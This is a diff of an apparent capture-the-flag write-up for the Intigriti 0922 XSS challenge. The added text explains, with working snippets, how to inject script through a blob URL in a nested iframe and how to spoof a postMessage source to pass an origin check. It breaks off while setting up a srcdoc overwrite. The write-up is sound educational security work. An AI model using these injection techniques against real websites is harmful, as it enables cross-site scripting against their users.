@@ -363,8 +363,10 @@ We will do the latter.
   // document.querySelector('iframe').contentWindow 
   // document.getElementById('i').contentWindow
   // window.i.contentWindow
-  // or simply
+  // window.frames[0]
   // i.contentWindow 
+  // or the shortest way
+  // frames[0]
   // all now hold a window reference to the embedded page
 </script>
 ```
@@ -409,6 +411,10 @@ Here we try to `console.log` the `magic.php` iframe's location. See https://edit
 ```
 <iframe onload=run() id=i src="https://challenge-0922.intigriti.io/challenge/"></iframe>
 <script>
+  // i.contentwindow is the iframe right above
+  // from that iframe we will have to select the the inner iframe of `magic.php`
+  // that's how you get i.contentWindow.frames[0]
+  // or you could use just frames[0][0]
   run = e => console.log(i.contentWindow.frames[0].location.href)
 </script>
 ```
@@ -462,8 +468,54 @@ If we would open this URL we would see a big "hello" and an alert popup.
 The browser itself created this file internally. And that's why only the 
 browser window that created the URL can open it.
 
-But how will this new knowledge help us tricking?
+Wait a second! We can finally inject arbitrary javascript! Did we solve
+the challenge?
 
+```
+<iframe onload=run() id=i src="https://challenge-0922.intigriti.io/challenge/"></iframe>
+<script>
+  run = e => {
+    burl = URL.createObjectURL(new Blob(['<script>alert(document.domain)<' + '/script>'], {type : 'text/html'}))
+    i.contentWindow.frames[0].location = burl 
+  }
+</script>
+```
+
+Sidenote: You may find this part weird `'<script>alert(document.domain)<'+'/script>'`. Why
+split up the string like that `'...n)<' + '/script>'`. It needed because you cannot
+have the string `</script>` in actual javascript code. It will break the parser. Try it
+and see for yourself https://editor.43z.one/bgn21
+```
+<script>
+  let myVar = `</script>`
+</script>
+```
+`Uncaught SyntaxError: '' literal not terminated before end of script i:2:15`
+
+Anyway continuing. Will it work, will we finally see a popup? No. chrome will show
+an error. `Ignored call to 'alert()'. The document is sandboxed, and the 'allow-modals' keyword is not set.`
+
+Because the `iframe` from `index.php` has the attribute `sandbox="allow-scripts allow-same-origin"`
+it does only allow what the santbox attribute sets. For modals like `alert()`, `prompt()`
+or `print()` it would need the 'allow-modals' sandbox attribute. Let's just quickly
+change the `alert` to an `console.log` and see what `document.domain` says.
+
+https://editor.43z.one/mj1mm
+```
+<iframe onload=run() id=i src="https://challenge-0922.intigriti.io/challenge/"></iframe>
+<script>
+  run = e => {
+    burl = URL.createObjectURL(new Blob(['<script>console.log(document.domain)<' + '/script>'], {type : 'text/html'}))
+    i.contentWindow.frames[0].location = burl 
+  }
+</script>
+```
+The console shows `editor.43z.one` this means we are not in the context of the challenge
+which would be `challenge-0922.intigriti.io`. The point of the challenge
+is to proof to have control over `challenge-0922.intigriti.io` not some random
+3rd party domain.
+
+So we are not done yet. The blob trick still works so how would it help us tricking
 ```
 window.addEventListener('message', e => {
   if (e.source !== document.querySelector('#ball').contentWindow){
@@ -471,9 +523,11 @@ window.addEventListener('message', e => {
   }
 });
 ```
-Well we could load the `<iframe>` of `magic.php` with the id of `ball`
+to get to the `setAttribute`, `removeAttribute` part? Well we could load into the 
+`<iframe>` of `magic.php` with the id of `ball`
 a blob URL which we have full control over. From that "blobbed" file we will then
-send a `postMessage` to the parent. That way `e.source` will be equal to `document.querySelector('#ball').contentWindow`
+send a `postMessage` to the parent. That way `e.source` will be equal to 
+`document.querySelector('#ball').contentWindow`
 
 Something like this https://editor.43z.one/15kr5
 ```
@@ -489,15 +543,15 @@ Something like this https://editor.43z.one/15kr5
   }
 </script>
 ```
-If we check the console we will see the `hello!`. This comes directly from the
+If we check the console we will see the `hello!` printed. This comes directly from the
 default case of the switch we wanted to get at. That also means we successfully tricked
-the 
+the if clause.
 ```
 if (e.source !== document.querySelector('#ball').contentWindow){
   e.stopImmediatePropagation();
 }
 ```
-and got until there
+and got until here
 
 ```
 addEventListener('message', e => {
@@ -508,6 +562,39 @@ addEventListener('message', e => {
   }
 });
 ```
+It took long to get to here but how to continue? Now that we can finally make
+use of the `setAttribute` function call.
+
+We came across two intresting attribute of `<iframe>`, `src` and `srcdoc`.
+The cool thing about changing the `srcdoc` is that it doesn't switch context.
+The iframe keeps having access to the parent. It's not really considered a new
+domain so it doesn't break SameOriginPolicy. See for yourself https://editor.43z.one/mgwn6
+
+```
+<script>
+  var i = "i'm a global variable"
+</script>
+
+<iframe srcdoc="<script>alert(parent.i)</script>"></iframe>
+```
+That's because it never changed domain. If we run this 
+
+```
+<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
+```
+from https://editor.43z.one/244ck it would show `editor.43z.one`.
+
+This is perfect. We will use this fact about `srcdoc` to our advantage.
+We will craft a message that triggers this part of the code
+```
+...
+  case 'set':
+    [...document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value));
+    break;
+...
+```
+And change the `srcdoc` of the `<iframe>`. At this point the iframe will no longer
+hold the `magic.php` but our blobed URL
 
 
 
